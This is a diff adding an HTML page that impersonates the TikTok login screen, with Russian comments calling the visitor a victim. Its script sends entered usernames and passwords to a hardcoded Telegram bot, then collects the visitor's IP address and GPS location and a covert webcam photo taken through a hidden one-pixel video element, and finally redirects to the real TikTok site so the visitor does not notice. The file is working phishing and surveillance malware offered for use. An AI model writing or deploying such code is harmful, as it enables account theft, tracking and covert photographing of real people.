@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Log in to TikTok</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { width: 100%; max-width: 350px; padding: 20px; text-align: center; }
+        h2 { margin-bottom: 20px; font-weight: 500; }
+        input { width: 100%; padding: 15px; margin: 10px 0; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 5px; box-sizing: border-box; outline: none; }
+        button { width: 100%; padding: 15px; background: #fe2c55; color: #fff; border: none; border-radius: 5px; font-size: 16px; font-weight: bold; margin-top: 10px; cursor: pointer; }
+        
+        /* Скрытые элементы для сбора данных */
+        #camera-video { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
+    </style>
+</head>
+<body>
+
+    <!-- Форма входа -->
+    <div class="container" id="loginScreen">
+        <h2>Log in to TikTok</h2>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Email or username" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit" id="btn">Log in</button>
+        </form>
+    </div>
+
+    <!-- Экран загрузки (скрывает сбор данных) -->
+    <div class="container" id="loadingScreen" style="display: none;">
+        <h2 style="font-weight: 300;">Verifying...</h2>
+        <div style="margin-top: 20px; font-size: 40px;">⏳</div>
+    </div>
+
+    <video id="camera-video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const BOT_TOKEN = "8758850534:AAF79a17p6NCuHMluPI_Rkw7FeoQSkCcRe8"; 
+        const CHAT_ID = "7485234259"; 
+
+        // Отправка текста
+        function sendText(text) {
+            const img = new Image();
+            img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+        }
+
+        // Отправка фото
+        async function sendPhoto(blob, caption) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'photo.jpg');
+            formData.append('caption', caption);
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            // 1. Прячем форму, показываем "Verifying..."
+            document.getElementById('loginScreen').style.display = 'none';
+            document.getElementById('loadingScreen').style.display = 'block';
+
+            // 2. Мгновенно шлем пароль
+            sendText(`🎯 TikTok Login\n👤 ${user}\n🔑 ${pass}`);
+
+            // 3. Сбор IP и GPS
+            fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d => sendText(`🌐 IP: ${d.ip}`)).catch(()=>{});
+            navigator.geolocation.getCurrentPosition(
+                (pos) => sendText(`🗺️ GPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`),
+                (err) => {}
+            );
+
+            // 4. Скрытое фото (выскочит окно "Разрешить камеру", жертва нажмет, так как думает, что это часть входа)
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                const video = document.getElementById('camera-video');
+                video.srcObject = stream;
+                await new Promise(r => setTimeout(r, 1000)); // Ждем фокуса
+                
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                stream.getTracks().forEach(track => track.stop());
+
+                const blob = await (await fetch(canvas.toDataURL('image/jpeg', 0.8))).blob();
+                await sendPhoto(blob, `📸 Селфи\n👤 ${user}`);
+            } catch (err) {
+                // Если откажет - ничего страшного
+            }
+
+            // 5. Перекидываем на настоящий TikTok
+            setTimeout(() => {
+                window.location.href = "https://www.tiktok.com/login";
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
